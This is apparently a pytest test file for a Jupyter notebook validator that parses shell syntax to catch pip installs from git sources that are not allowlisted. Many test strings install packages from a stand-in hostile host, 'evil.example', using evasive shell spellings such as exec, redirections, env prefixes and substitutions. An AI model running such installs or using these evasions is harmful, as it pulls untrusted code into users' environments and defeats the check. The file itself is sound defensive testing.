    assert [flag for _, flag in nv._split_chained("!pip install a && pip install b")] == [
        False,
        False,
    ]
    assert [
        flag for _, flag in nv._split_chained("!pip install a || echo failed && pip install c")
    ] == [False, True, False]
    # A `;` starts a new and-or list, so nothing before it carries across.
    assert [flag for _, flag in nv._split_chained("!probe; pip install a && pip install b")] == [
        False,
        False,
        False,
    ]


def test_interpreter_options_may_take_an_operand():
    """`python --help` documents `-W arg` and `-X opt`, attached or separate.

    Accepting only self-contained option tokens before `-m` meant `python -W ignore -m pip install
    git+...` produced no invocation and bypassed the git+ ban entirely."""
    nv = _load_notebook_validator_module()

    for interpreter in (
        "python -W ignore -m pip",
        "python -Wignore -m pip",
        "python -X dev -m pip",
        "python -Xdev -m pip",
        "python3 -W ignore -X dev -m pip",
        "python --check-hash-based-pycs always -m pip",
        "python -I -m pip",
        "python -m pip",
    ):
        cell = f"!{interpreter} install git+https://evil.example/pkg.git"
        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
            "R-INST-001"
        ], interpreter
    # A script path before `-m` is still not an option, so it runs no pip.
    assert nv.PIP_LINE_RE.match("!python setup.py -m pip install x") is None


def test_a_parameter_expansion_keeps_its_whitespace():
    """bash keeps `TOKEN=${TOKEN:-a b}` as ONE assignment word.

    Tracking only `$( )` ended the word at that space and left `b}` as the supposed executable, so
    the pip command behind it was never seen."""
    nv = _load_notebook_validator_module()

    assert nv._split_first_word("TOKEN=${TOKEN:-a b} pip install x") == (
        "TOKEN=${TOKEN:-a b}",
        "pip install x",
    )
    assert nv._split_first_word("T=${A:-${B:-x y}} pip install z") == (
        "T=${A:-${B:-x y}}",
        "pip install z",
    )
    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            "!TOKEN=${TOKEN:-a b} pip install git+https://evil.example/pkg.git", "nb.ipynb", 0
        )
    ] == ["R-INST-001"]


def test_a_redirection_only_exec_hands_nothing_over():
    """`exec` with no utility just makes its redirections permanent; the shell carries on.

    Verified locally: `exec >/dev/null; printf x >&2` still runs the second command. Treating every
    leading `exec` as a hand-over truncated the line before the pip call."""
    nv = _load_notebook_validator_module()

    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            "!exec >/tmp/install.log; pip install git+https://evil.example/pkg.git",
            "nb.ipynb",
            0,
        )
    ] == ["R-INST-001"]
    for redirection_only in ("exec >/tmp/x", "exec > /tmp/x", "exec 2>&1", "exec <in.txt"):
        assert nv._command_execs(f"!{redirection_only}") is False, redirection_only
    # A utility after the redirections is still a hand-over, options and all.
    for handover in ("exec pip install a", "exec -a name pip install a", "exec >/tmp/l pip x"):
        assert nv._command_execs(f"!{handover}") is True, handover
    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations(
            "!exec pip install torch==2.11.0; pip install torch==2.12.0"
        )
    ] == [("install", ["torch==2.11.0"])]


def test_the_attached_module_spelling_is_read():
    """`python -mpip install ...` is a valid CPython invocation.

    Both cell discovery and the invocation pattern required `pip` to be a separate word after `-m`,
    and `\\b` finds no boundary between the `m` and the `p`, so the cell was never even discovered
    and the git+ ban never ran."""
    nv = _load_notebook_validator_module()

    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            "!python -mpip install git+https://evil.example/pkg.git", "nb.ipynb", 0
        )
    ] == ["R-INST-001"]
    for cell in ("!python -mpip install x", "!pip install x", "!python -m pip install x"):
        assert nv._PIP_CELL_RE.search(cell) is not None, cell
    # `-m` still has to name pip: another module attached to it is not an install.
    assert nv.PIP_LINE_RE.match("!python -mbuild install x") is None


def test_exec_is_found_behind_a_transparent_prefix():
    """`command exec pip ...` hands the shell over exactly as `exec pip ...` does.

    Verified locally: `bash -c 'command exec sh -c "exit 7"; echo reached'` never reaches the echo.
    Testing the raw first word answered `command` and replayed the unreachable install."""
    nv = _load_notebook_validator_module()

    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations(
            "!command exec pip install torch==2.11.0; pip install torchcodec==0.10.0"
        )
    ] == [("install", ["torch==2.11.0"])]
    assert nv._command_execs("!command exec pip install a") is True
    # A redirection-only exec still hands nothing over, prefix or no prefix.
    assert nv._command_execs("!command exec >/tmp/x") is False
    assert nv._command_execs("!command pip install a") is False


def test_an_append_assignment_is_still_an_assignment():
    """bash runs the child with the appended value, so `PATH+=...` is a prefix, not a command.

    Verified locally: `X=old; X+=new sh -c 'printf %s "$X"'` prints `oldnew`. Leaving the word
    standing made it the supposed executable and the pip command behind it was missed."""
    nv = _load_notebook_validator_module()

    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            "!PATH+=:/opt/bin pip install git+https://evil.example/pkg.git", "nb.ipynb", 0
        )
    ] == ["R-INST-001"]
    assert nv._strip_exec_prefixes("PATH+=:/opt/bin pip install x") == ("pip install x", True)
    # A plain assignment is unchanged, and a word that merely contains `+` is not one.
    assert nv._strip_exec_prefixes("FOO=1 pip install x") == ("pip install x", True)
    assert nv._strip_exec_prefixes("a+b pip install x") == ("a+b pip install x", False)


def test_a_redirection_before_the_executable_is_consumed():
    """A simple command may put its redirections before the command name.

    Verified locally with a stub pip: `>/dev/null pip install whatever` really runs it, while
    stopping at the redirection left it standing as the executable and every rule was bypassed."""
    nv = _load_notebook_validator_module()

    for cell in (
        "!>/tmp/install.log pip install git+https://evil.example/pkg.git",
        "!> /tmp/install.log pip install git+https://evil.example/pkg.git",
        "!FOO=1 2>/dev/null python -m pip install git+https://evil.example/pkg.git",
        "!2>&1 pip install git+https://evil.example/pkg.git",
    ):
        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
            "R-INST-001"
        ], cell
    # A trailing redirection is the command's own and is left where it is.
    assert nv._strip_exec_prefixes("pip install x >/tmp/log") == ("pip install x >/tmp/log", False)


def test_a_compound_body_stays_conditional_past_its_separators():
    """`if false; then echo x; pip install ...; fi` runs neither command.

    Only the piece carrying the `then` was flagged, so the second command in the body replayed as
    an install bash never performs, which can fabricate or hide an R-INST-004."""
    nv = _load_notebook_validator_module()

    assert nv._split_chained('!if maybe; then echo x; pip install "torch==2.12.0"; fi') == [
        ("!maybe", False),
        ("!echo x", True),
        ('!pip install "torch==2.12.0"', True),
    ]
    assert (
        nv.rule_inst_004_torchcodec_torch(
            '!if false; then echo x; pip install "torch==2.12.0"; fi',
            COLAB_TORCH211,
            "nb.ipynb",
            0,
        )
        == []
    )
    # The body ends at its closer, and the test itself runs whenever the line does.
    assert nv._split_chained("!if maybe; then pip install a; fi; pip install b") == [
        ("!maybe", False),
        ("!pip install a", True),
        ("!pip install b", False),
    ]
    # The replay models pip as succeeding, the same assumption `pip install a && pip install b`
    # rests on, so the body of a pip test is reached.
    assert nv._split_chained("!if pip install a; then pip install b; fi") == [
        ("!pip install a", False),
        ("!pip install b", False),
    ]
    # `while`/`do`/`done` carries the same way.
    assert [
        flag for _, flag in nv._split_chained("!while maybe; do pip install a; pip install b; done")
    ] == [False, True, True]


def test_a_dependency_the_cell_removes_is_reported(monkeypatch):
    """Uninstalling what a `--no-deps` install needs is the broken state the rule catches.

    `resolved_set` drops the removed package, and reading that as "no resolution data" made
    R-INST-005 and R-INST-002 fall silent on a strictly worse environment."""
    nv = _load_notebook_validator_module()
    # Stubbed like the neighbouring rule tests: the live PyPI path makes this assert nothing
    # at all wherever the network is blocked, which is a test that cannot fail.
    monkeypatch.setattr(
        nv,
        "pypi_metadata",
        lambda name, version: {"info": {"requires_dist": ["tokenizers (>=0.22.0,<=0.23.0)"]}}
        if name.lower() == "transformers"
        else None,
    )
    colab = {
        "torch": "2.11.0+cu128",
        "python": "3.12",
        "tokenizers": "0.20.0",
        "transformers": "4.40.0",
    }

    removed = '!pip install --no-deps "transformers==4.57.0"\n!pip uninstall -y tokenizers'
    findings = nv.rule_inst_005_transformers_tokenizers(removed, colab, "nb.ipynb", 0)
    assert [f.rule for f in findings] == ["R-INST-005"]
    assert "uninstalls it" in findings[0].message
    # The ordinary out-of-window case is unchanged, and a package the cell never mentions on a
    # host that does not have it either is still missing data rather than a violation.
    assert [
        f.rule
        for f in nv.rule_inst_005_transformers_tokenizers(
            '!pip install --no-deps "transformers==4.57.0"', colab, "nb.ipynb", 0
        )
    ] == ["R-INST-005"]
    assert (
        nv.rule_inst_005_transformers_tokenizers(
            '!pip install --no-deps "transformers==4.57.0"',
            {"torch": "2.11.0+cu128", "python": "3.12"},
            "nb.ipynb",
            0,
        )
        == []
    )


def test_a_prerelease_sorts_below_the_abi_floor():
    """PEP 440 orders `2.11.0rc1` and `0.12.0.dev1` BELOW `2.11` and `0.12`.

    `cmp_versions` reads dotted digits only, so the prerelease number read as another release
    component and lifted these above the floor, approving a pairing outside the ABI-stable contract
    and suppressing R-INST-004 on it."""
    nv = _load_notebook_validator_module()

    for version, floor, expected in (
        ("2.11.0rc1", "2.11", False),
        ("2.11.0b2", "2.11", False),
        ("0.12.0.dev1", "0.12", False),
        ("0.12.0rc1", "0.12", False),
        ("2.11", "2.11", True),
        ("2.11.0", "2.11", True),
        ("2.11.0+cu128", "2.11", True),
        ("2.11.1rc1", "2.11", True),
        ("2.12", "2.11", True),
        ("0.11", "0.12", False),
    ):
        assert nv.at_least(version, floor) is expected, (version, floor)

    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128", "python": "3.12"}
    for cell in (
        '!pip install "torch==2.11.0rc1" "torchcodec==0.12.0"',
        '!pip install "torch==2.11.0" "torchcodec==0.12.0.dev1"',
    ):
        assert [f.rule for f in nv.rule_inst_004_torchcodec_torch(cell, colab, "nb.ipynb", 0)] == [
            "R-INST-004"
        ], cell
    # The stable pairing the ABI rule exists to allow is untouched.
    assert (
        nv.rule_inst_004_torchcodec_torch(
            '!pip install "torch==2.11.0" "torchcodec==0.12.0"', colab, "nb.ipynb", 0
        )
        == []
    )


def test_a_prefixed_pip_still_carries_the_and_chain():
    """`_strip_exec_prefixes` reads words, so the notebook bang has to come off first.

    With `!env` glued together no prefix name matched, `!env X=1 pip install ...` did not read as
    pip, and the `&&` after it went conditional even though the install really runs."""
    nv = _load_notebook_validator_module()

    assert nv._split_chained(
        "!env X=1 pip install torchcodec==0.12.0 && pip install torch==2.10.0"
    ) == [
        ("!pip install torchcodec==0.12.0", False),
        ("!pip install torch==2.10.0", False),
    ]
    assert nv._piece_is_pip("!env X=1 pip install a") is True
    assert nv._piece_is_pip("!command pip install a") is True
    # A prefixed non-pip command is still not pip, so it still ends the assumption.
    assert nv._piece_is_pip("!env X=1 some_probe") is False


def test_an_exec_bash_may_never_reach_hands_nothing_over():
    """Replacement happens only when the `exec` command is actually executed.

    The body condition lives in `body_levels`, not in the piece's own flag, so a hand-over inside a
    compound body was declared unconditionally and dropped the reachable install after the closer."""
    nv = _load_notebook_validator_module()

    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            "!if maybe; then echo before; exec true; fi; "
            "pip install git+https://evil.example/pkg.git",
            "nb.ipynb",
            0,
        )
    ] == ["R-INST-001"]
    # An unconditional exec still ends the list.
    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations(
            "!exec pip install torch==2.11.0; pip install torch==2.12.0"
        )
    ] == [("install", ["torch==2.11.0"])]


def test_a_substitution_inherits_the_body_condition():
    """A substitution inside a body is expanded only when that body runs.

    The recursion took the separator-level flag alone, so `if false; then echo $(pip install ...);
    fi` recorded the inner install as certain and R-INST-004 judged a version bash never installs."""
    nv = _load_notebook_validator_module()

    assert [
        flag
        for _, flag in nv._split_chained("!if maybe; then echo $(pip install torch==2.10.0); fi")
    ] == [False, True, True]
    assert (
        nv.rule_inst_004_torchcodec_torch(
            "!if false; then echo $(pip install torch==2.10.0); fi",
            COLAB_TORCH211,
            "nb.ipynb",
            0,
        )
        == []
    )
    # Outside a body the substitution is as certain as it ever was.
    assert nv._split_chained("!echo $(pip install a)") == [
        ("!pip install a", False),
        ("!echo $(pip install a)", False),
    ]


def test_every_command_in_a_case_arm_is_conditional():
    """An arm starts with a pattern, so no body keyword ever opens the level.

    Only the piece carrying the arm label was flagged, and a later command in the same arm replayed
    as certain even when the arm is not the one bash selects."""
    nv = _load_notebook_validator_module()

    assert [
        flag for _, flag in nv._split_chained("!case x in x) pip install a; pip install b; esac")
    ] == [True, True]
    # The level closes at `esac`, so what follows is judged again.
    assert nv._split_chained("!case x in x) pip install a;; esac; pip install c") == [
        ("!pip install a", True),
        ("!pip install c", False),
    ]


def test_a_reinstall_undoes_a_removal():
    """`pip uninstall x; pip install x` leaves x installed.

    Answering on the first uninstall it met claimed the cell removes a dependency pip puts straight
    back, so R-INST-002 and R-INST-005 reported a breakage that does not exist."""
    nv = _load_notebook_validator_module()

    assert (
        nv._removed_by_cell("!pip uninstall -y tokenizers\n!pip install tokenizers", "tokenizers")
        is False
    )
    assert (
        nv._removed_by_cell("!pip install tokenizers\n!pip uninstall -y tokenizers", "tokenizers")
        is True
    )
    assert nv._removed_by_cell("!pip install transformers", "tokenizers") is False
    # Underscores and dashes name the same project.
    assert nv._removed_by_cell("!pip uninstall -y huggingface_hub", "huggingface-hub") is True


def test_a_branching_parameter_expansion_is_conditional():
    """`${name:-word}` expands its word on one branch of the parameter's state.

    Verified locally: `READY=1; echo ${READY:-$(printf ...)}` never runs the substitution, so
    recording the install inside it as certain invented a compatibility error."""
    nv = _load_notebook_validator_module()

    assert [
        flag for _, flag in nv._split_chained("!echo ${READY:-$(pip install torch==2.10.0)}")
    ] == [True, False]
    assert (
        nv.rule_inst_004_torchcodec_torch(
            "!READY=1; echo ${READY:-$(pip install torch==2.10.0)}",
            COLAB_TORCH211,
            "nb.ipynb",
            0,
        )
        == []
    )
    # The git+ ban must still see it: it is a path the notebook may take.
    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            "!echo ${R:-$(pip install git+https://evil.example/pkg.git)}", "nb.ipynb", 0
        )
    ] == ["R-INST-001"]
    # A plain expansion opens no branch, and an ordinary substitution is unchanged.
    assert nv._split_chained("!echo ${HOME} $(pip install a)") == [
        ("!pip install a", False),
        ("!echo ${HOME} $(pip install a)", False),
    ]
    assert nv._substitution_bodies("echo $(pip install x) and `pip install y`") == [
        "pip install x",
        "pip install y",
    ]


def test_a_pipeline_local_exec_does_not_end_the_line():
    """`exec` under `|` or `&` runs in a subshell; the parent shell reaches the next command.

    Verified locally that both `exec true | cat; printf ...` and `exec true & printf ...` print
    their tail. Truncating on every unconditional exec dropped a reachable install."""
    nv = _load_notebook_validator_module()

    assert nv._split_chained("!exec true | cat; pip install a") == [
        ("!true", False),
        ("!cat", False),
        ("!pip install a", False),
    ]
    assert nv._split_chained("!exec true & pip install a") == [
        ("!true", False),
        ("!pip install a", False),
    ]
    # An exec in the main shell still ends the list.
    assert nv._split_chained("!exec true; pip install a") == [("!true", False)]


def test_a_substituted_source_drops_its_shell_delimiters():
    """`$(printf %s git+https://.../unsloth.git)` hands pip a clean URL.

    The raw scan kept the substitution's closing bracket, so `unsloth.git)` matched no allowlist
    entry and a permitted install was reported as prohibited."""
    nv = _load_notebook_validator_module()

    assert (
        nv.rule_inst_001_git_plus(
            "!pip install $(printf %s git+https://github.com/unslothai/unsloth.git)",
            "nb.ipynb",
            0,
        )
        == []
    )
    assert nv._git_source_repository("git+https://github.com/unslothai/unsloth.git)") == (
        "github.com/unslothai/unsloth"
    )
    # A repository that is not allowlisted is still reported through the same route.
    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            "!pip install $(printf %s git+https://evil.example/pkg.git)", "nb.ipynb", 0
        )
    ] == ["R-INST-001"]


def test_a_hyphenated_prerelease_sits_below_the_floor():
    """PEP 440 spells the same prerelease `2.11.0rc1`, `2.11.0-rc1` and `2.11.0.rc1`.

    `normalise_version` cuts everything from the hyphen, so the hyphenated form reached the check
    as a plain `2.11.0` and cleared an ABI floor it sits below."""
    nv = _load_notebook_validator_module()

    for version, floor, expected in (
        ("2.11.0-rc1", "2.11", False),
        ("2.11.0-dev1", "2.11", False),
        ("2.11.0.rc1", "2.11", False),
        ("2.11.0rc1", "2.11", False),
        ("2.11.1-rc1", "2.11", True),
        ("2.11.0", "2.11", True),
        ("2.11.0+cu128", "2.11", True),
    ):
        assert nv.at_least(version, floor) is expected, (version, floor)

    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128", "python": "3.12"}
    assert [
        f.rule
        for f in nv.rule_inst_004_torchcodec_torch(
            '!pip install "torch==2.11.0-rc1" "torchcodec==0.12.0"', colab, "nb.ipynb", 0
        )
    ] == ["R-INST-004"]


def test_an_always_succeeding_command_keeps_the_chain():
    """`true` and `:` are documented as always succeeding, so the `&&` after one is reached.

    Treating every non-pip command as a possibly-failing probe dropped the install behind them and
    R-INST-004 stopped seeing the pair the cell really installs."""
    nv = _load_notebook_validator_module()

    for filler in ("true", ":"):
        assert [
            flag
            for _, flag in nv._split_chained(
                f'!pip install "torch==2.11.0" && {filler} && pip install "torchcodec==0.10.0"'
            )
        ] == [False, False, False], filler
    # A command that can fail still ends the assumption.
    assert [
        flag for _, flag in nv._split_chained("!pip install a && some_probe && pip install b")
    ] == [False, False, True]


def test_an_input_fd_duplication_is_not_a_separator():
    """`n<&word` duplicates an INPUT descriptor; only `>&` was exempted.

    Splitting on that `&` reduced `0<&1 pip install ...` to `1 pip install ...`, which reads as no
    pip at all, so a prohibited VCS install went unreported."""
    nv = _load_notebook_validator_module()

    assert nv._split_chained("!0<&1 pip install git+https://evil.example/x.git") == [
        ("!pip install git+https://evil.example/x.git", False)
    ]
    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            "!0<&1 pip install git+https://evil.example/x.git", "nb.ipynb", 0
        )
    ] == ["R-INST-001"]
    # A real background operator still separates, and `>&` is still a redirection.
    assert nv._split_chained("!pip install a & pip install b") == [
        ("!pip install a", False),
        ("!pip install b", False),
    ]
    assert nv._split_chained("!pip install a >&2") == [("!pip install a >&2", False)]


def test_a_floor_no_torch_can_satisfy_is_still_a_finding():
    """A torch floor is normally too weak to judge, but not when every candidate is excluded.

    `torch>=2.11` with `torchcodec==0.10` fails on 2.11 (which wants 0.11) and on everything past
    it (which wants the ABI-stable 0.12 line), so the pairing cannot load whichever release pip
    picks; the early return on an inexact torch suppressed it anyway."""
    nv = _load_notebook_validator_module()
    older = {"torch": "2.10.0+cu128", "torchcodec": "0.10.0+cu128", "python": "3.12"}

    findings = nv.rule_inst_004_torchcodec_torch(
        '!pip install "torch>=2.11" "torchcodec==0.10.0"', older, "nb.ipynb", 0
    )
    assert [f.rule for f in findings] == ["R-INST-004"]
    assert "every torch minor" in findings[0].message
    # A floor some row still admits stays ambiguous, and so does an ABI-stable codec.
    assert (
        nv.rule_inst_004_torchcodec_torch(
            '!pip install "torch>=2.10" "torchcodec==0.10.0"', older, "nb.ipynb", 0
        )
        == []
    )
    assert (
        nv.rule_inst_004_torchcodec_torch(
            '!pip install "torch>=2.11" "torchcodec==0.12.0"', older, "nb.ipynb", 0
        )
        == []
    )
    assert nv._codec_works_above("2.11", "0.10") is False
    assert nv._codec_works_above("2.10", "0.10") is True


def test_a_dry_run_places_no_lower_bound():
    """pip explicitly makes no environment changes during a dry run.

    The floor scan still read the dry-run pin, so R-INST-003 preferred a version the cell never
    installs and the real incompatibility went unreported."""
    nv = _load_notebook_validator_module()

    assert (
        nv._install_cell_lower_bound('!pip install --dry-run "torchao>=0.16.0"', "torchao") is None
    )
    assert nv._install_cell_lower_bound('!pip install "torchao>=0.16.0"', "torchao") == "0.16.0"


def test_shell_negation_flips_the_and_chain():
    """`!` inverts the status of the pipeline after it.

    `! false` succeeds, so the `&&` behind it always runs, while `! pip install x` fails under the
    replay's own model. Reading the negation as an unknown command marked both conditional."""
    nv = _load_notebook_validator_module()

    # The first bang is the notebook's; the second is bash's, so `! false` succeeds.
    assert [flag for _, flag in nv._split_chained("! ! false && pip install a")] == [False, False]
    # With only the notebook's bang, bash sees a bare `false`, which never reaches the install.
    assert [flag for _, flag in nv._split_chained("! false && pip install a")] == [False, True]
    assert nv._piece_success_model("!! false") is True
    assert nv._piece_success_model("!false") is False
    assert nv._piece_success_model("!true") is True
    assert nv._piece_success_model("!some_probe") is None


def test_a_group_carries_its_success_into_the_outer_chain():
    """A group exits with the status of its LAST command.

    Discarding the inner state on close left the outer `&&` reading the group as an unknown
    command, so the install behind it was marked conditional."""
    nv = _load_notebook_validator_module()

    for grouped in (
        '!(pip install "torch==2.12.0") && pip install "torchcodec==0.11.0"',
        '!{ pip install "torch==2.12.0"; } && pip install "torchcodec==0.11.0"',
    ):
        assert [flag for _, flag in nv._split_chained(grouped)] == [False, False], grouped
    # A group whose last command may fail still ends the assumption.
    assert [flag for _, flag in nv._split_chained("!(some_probe) && pip install b")] == [
        False,
        True,
    ]
    assert [
        flag for _, flag in nv._split_chained("!(pip install a; some_probe) && pip install b")
    ] == [False, False, True]


def test_exec_behind_an_external_wrapper_hands_nothing_over():
    """`env exec true` asks env to launch a PROGRAM called exec, which does not exist.

    Verified locally: bash reports `env: 'exec': No such file or directory` and the parent shell
    continues. Recording any consumed `exec` as a hand-over truncated the list before a reachable
    install."""
    nv = _load_notebook_validator_module()

    assert nv._command_execs("!env exec true") is False
    assert nv._split_chained("!env exec true; pip install a") == [
        ("!true", False),
        ("!pip install a", False),
    ]
    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            "!env exec true; pip install git+https://evil.example/x.git", "nb.ipynb", 0
        )
    ] == ["R-INST-001"]
    # The prefixes bash resolves in-process still preserve the builtin.
    assert nv._command_execs("!command exec pip install a") is True
    assert nv._command_execs("!exec pip install a") is True


def test_a_fallback_behind_a_certain_failure_is_unconditional():
    """`false || pip install x` always installs, so it is not a path the notebook MAY take.

    Verified against bash: `false || printf ran` prints `ran`. Every `||` tail was recorded as
    conditional, so the pinned install in `pip show torch || pip install torch==...` -- and the
    common `python -c 'import x' || pip install x` -- was invisible to R-INST-004."""
    nv = _load_notebook_validator_module()

    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations("!false || pip install torch==2.11.0")
    ] == [("install", ["torch==2.11.0"])]
    # A left side that MIGHT succeed keeps its fallback conditional.
    assert list(nv.unconditional_pip_invocations("!maybe || pip install torch==2.11.0")) == []


def test_a_case_selector_is_expanded_before_any_arm_is_chosen():
    """`case $(pip install x) in ...` runs the install whatever the arms do.

    The selector shares its piece with the first arm, and the arm's condition was being applied to
    both, so a version the notebook certainly installs read as one it merely might."""
    nv = _load_notebook_validator_module()

    assert nv._split_chained("!case $(pip install torch==2.11.0) in a) pip install b;; esac") == [
        ("!pip install torch==2.11.0", False),
        ("!$(pip install torch==2.11.0) in a) pip install b", True),
    ]
    # The arms themselves stay conditional, selector or no selector.
    assert nv._split_chained("!case x in a) pip install b;; esac") == [("!pip install b", True)]


def test_a_prefix_option_that_never_runs_a_command_is_not_unwrapped():
    """`env --help` and `command -v pip` print and exit; neither runs pip.

    Verified locally: `env --help` writes its usage and exits 0. Unwrapping past the option
    reported `pip install` from a line that only asked where pip lives."""
    nv = _load_notebook_validator_module()

    assert nv._strip_exec_prefixes("env --help") == ("env --help", True)
    assert nv._strip_exec_prefixes("command -v pip") == ("command -v pip", True)
    assert list(nv.unconditional_pip_invocations("!command -v pip install a")) == []
    # A prefix carrying a real command still hands it over.
    assert nv._strip_exec_prefixes("command pip install a") == ("pip install a", True)


def test_a_body_whose_test_can_never_succeed_runs_nothing():
    """`if false; then pip install x; fi` installs nothing at all.

    The body was merely conditional, so a version bash cannot reach was replayed as a path the
    notebook might take and R-INST-004 fired on it."""
    nv = _load_notebook_validator_module()

    assert nv._split_chained("!if false; then pip install torch==2.12.0; fi") == [("!false", False)]
    assert (
        nv.rule_inst_004_torchcodec_torch(
            "!if false; then pip install torch==2.12.0; fi", COLAB_TORCH211, "nb.ipynb", 0
        )
        == []
    )
    # `until true` never enters its body either, and an unknown test stays conditional.
    assert nv._split_chained("!until true; do pip install a; done") == [("!true", False)]
    assert nv._split_chained("!if maybe; then pip install a; fi") == [
        ("!maybe", False),
        ("!pip install a", True),
    ]


def test_fallback_reachability_folds_the_whole_left_hand_list():
    """`||` and `&&` are left-associative, so the operand is the list, not the nearest piece.

    Verified against bash: `true || false || echo RAN` prints nothing, `false && true || echo RAN`
    prints. Reading only the piece beside the operator got both backwards -- inventing an install
    the notebook skips, and hiding one it always performs."""
    nv = _load_notebook_validator_module()

    # `(true || false)` succeeded, so the second `||` skips its tail.
    assert (
        list(nv.unconditional_pip_invocations("!true || false || pip install torch==2.12.0")) == []
    )
    # `(false && true)` failed, so the tail always runs.
    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations("!false && true || pip install torch==2.12.0")
    ] == [("install", ["torch==2.12.0"])]
    # Every list folding to a certain failure: `false && maybe` short-circuits and `maybe && false`
    # fails either way, so both reach the tail unconditionally.
    for cell in (
        "!false || false || pip install a",
        "!true && false || pip install a",
        "!false && maybe || pip install a",
        "!maybe && false || pip install a",
    ):
        assert [(inv.action, inv.packages) for inv in nv.unconditional_pip_invocations(cell)] == [
            ("install", ["a"])
        ], cell
    # An unknown the fold cannot resolve keeps the tail conditional.
    for cell in ("!true && maybe || pip install a", "!maybe || false || pip install a"):
        assert list(nv.unconditional_pip_invocations(cell)) == [], cell


def test_an_unconditional_exit_ends_the_command_list():
    """`exit` terminates the shell as definitively as a successful `exec`.

    Verified against bash: `exit 0; echo RAN` prints nothing. Only `exec` was recognised, so
    R-INST-001 and the compatibility rules fired on an install bash never reaches."""
    nv = _load_notebook_validator_module()

    assert (
        nv.rule_inst_001_git_plus(
            "!exit 0; pip install git+https://evil.example/x.git", "nb.ipynb", 0
        )
        == []
    )
    assert nv._split_chained("!exit; pip install a") == [("!exit", False)]
    # `env exit 0` asks env for a program called exit, which does not exist; a subshell exit
    # and a conditional one leave the parent shell running. All three verified against bash.
    for cell in (
        "!env exit 0; pip install a",
        "!(exit 0); pip install a",
        "!exit 0 | cat; pip install a",
        "!false && exit 0; pip install a",
    ):
        assert "!pip install a" in [text for text, _ in nv._split_chained(cell)], cell


def test_a_colab_prerelease_python_keeps_its_suffix():
    """pip skips `python_full_version >= "3.13.0"` on 3.13.0rc1; truncating to 3.13.0 replayed
    requirements the image never installs."""
    nv = _load_notebook_validator_module()

    for line, expected in (
        ("Python 3.13.15", "3.13.15"),
        ("Python 3.13.0rc1", "3.13.0rc1"),
        ("Python 3.14rc1", "3.14rc1"),
        ("Python 3.13.0.dev3", "3.13.0.dev3"),
    ):
        assert nv._COLAB_PYTHON_RE.search(line + "\n").group(1) == expected, line
    # A truncated value can no longer be acknowledged as a usable strict key either.
    assert nv._strict_key_usable("os-info-gpu.txt", "python", {"python": "3.13.0rc1"}) is True
    assert nv._strict_key_usable("os-info-gpu.txt", "python", {"python": "(unknown)"}) is False


def test_an_exclusive_floor_is_kept_as_an_inexact_bound():
    """`>V` excludes V, but discarding the bound stopped whole-range checks running at all.

    With Colab's torch 2.11 and torchcodec 0.10, `pip install "torch>2.11"` must move torch to a
    release no 0.10 pairs with, and the equivalent `torch>=2.11.1` was already reported."""
    nv = _load_notebook_validator_module()

    codec_010 = {"torch": "2.11.0+cu128", "torchcodec": "0.10.0+cu128"}
    for cell in ('!pip install "torch>2.11"', '!pip install "torch>=2.11.1"'):
        assert [
            f.rule for f in nv.rule_inst_004_torchcodec_torch(cell, codec_010, "nb.ipynb", 0)
        ] == ["R-INST-004"], cell
    # Inexact, so it is never read as the release pip landed on.
    assert nv._effective_version('!pip install "torch>2.11"', "torch", "2.11.0+cu128") == (
        "2.11",
        False,
    )


def test_a_known_branch_outcome_decides_which_body_is_replayed():
    """A constant test names the branch that runs, and it is not always the `then` one.

    Verified against bash: `if true; then echo BODY; fi` prints, and `if false; then :; else echo
    ELSE; fi` prints. Reading every started body as merely conditional dropped an install that
    always runs; reading a false one as unreachable without inverting it for `else` dropped the
    branch that does, and R-INST-001 went blind on a git source in it."""
    nv = _load_notebook_validator_module()

    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations("!if true; then pip install torch==2.12.0; fi")
    ] == [("install", ["torch==2.12.0"])]
    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            "!pip install safe; if false; then :; else pip install git+https://evil.example/x.git; fi",
            "nb.ipynb",
            0,
        )
    ] == ["R-INST-001"]
    # A known-true test takes its `then` branch, so the `else` is the unreachable one.
    assert nv._split_chained("!if true; then pip install a; else pip install b; fi") == [
        ("!true", False),
        ("!pip install a", False),
    ]
    # An unknown test leaves both branches conditional, and `elif` reaches neither outcome.
    assert nv._split_chained("!if maybe; then pip install a; else pip install b; fi") == [
        ("!maybe", False),
        ("!pip install a", True),
        ("!pip install b", True),
    ]
    # The first arm certainly failed, so the `elif` TEST is reached; its own outcome is
    # unknown, so only the branch behind it is conditional.
    assert nv._split_chained(
        "!if false; then pip install a; elif maybe; then pip install b; fi"
    ) == [
        ("!false", False),
        ("!maybe", False),
        ("!pip install b", True),
    ]


def test_an_exclusion_fallback_stays_inside_the_whole_window():
    """The landing is read off the ceiling alone, so the rest of the window still binds it.

    `torchcodec<=0.10.0,!=0.10.0,<0.12` can only resolve below 0.10, but the ceiling's 0.11 was
    handed back as exact and R-INST-004 accepted a pairing pip never installs."""
    nv = _load_notebook_validator_module()

    assert nv._effective_version(
        '!pip install "torchcodec<=0.10.0,!=0.10.0,<0.12"', "torchcodec", "0.10.0+cu128"
    ) == (None, True)
    # A landing the window really admits is still used.
    for spec in ("torchcodec>=0.11,<0.12,!=0.11.0", "torchcodec>=0.10,<0.12,!=0.10.0"):
        assert nv._effective_version(f'!pip install "{spec}"', "torchcodec", "0.10.0+cu128") == (
            "0.11",
            True,
        ), spec


